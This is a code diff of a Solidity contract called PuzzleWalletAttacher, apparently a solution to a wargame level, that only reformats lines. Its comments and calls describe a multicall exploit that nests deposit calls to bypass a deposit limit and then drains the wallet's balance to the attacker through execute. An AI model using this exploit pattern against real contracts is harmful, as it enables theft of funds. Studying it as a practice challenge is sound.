@@ -27,21 +27,11 @@ contract PuzzleWalletAttacher {
         // spend 1000000000000000 wei with deposit
         dataArray[0] = abi.encodeWithSignature("deposit()");
         // spend 1000000000000000 wei with execute sent to the attacker
-        dataArray[1] = abi.encodeWithSignature(
-            "execute(address,uint256,bytes)",
-            attacker,
-            1000000000000000,
-            ""
-        );
+        dataArray[1] = abi.encodeWithSignature("execute(address,uint256,bytes)", attacker, 1000000000000000, "");
 
         bytes[] memory data = new bytes[](2);
         data[0] = abi.encodeWithSignature("deposit()");
-        data[1] = abi.encodeWithSignature(
-            "execute(address,uint256,bytes)",
-            attacker,
-            1000000000000000,
-            ""
-        );
+        data[1] = abi.encodeWithSignature("execute(address,uint256,bytes)", attacker, 1000000000000000, "");
 
         // spend the rest of the balance with multicall calling deposit and execute twice
         // bypassing the deposit limit
